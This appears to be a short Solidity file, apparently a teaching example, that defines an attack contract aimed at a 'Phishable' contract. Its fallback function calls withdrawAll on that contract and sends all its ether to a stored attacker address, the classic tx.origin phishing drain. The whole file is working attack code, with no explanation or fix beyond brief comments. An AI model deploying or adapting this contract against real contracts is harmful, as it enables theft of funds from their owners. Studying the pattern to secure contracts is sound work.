import "PhishableContract.sol";

contract PhishableAttackContract {

	Phishable phishableContract;
	address attacker; // The attackers address to receive funds.

	constructor (Phishable _phishableContract, address _attackerAddress) {
		phishableContract = _phishableContract;
		attacker = _attackerAddress;
	}

	// whenever the fallback function is called, it will withdraw all ether
	// in honor of the owner of phishableContract.
	function () payable {
		phishableContract.withdrawAll(attacker);
	}
}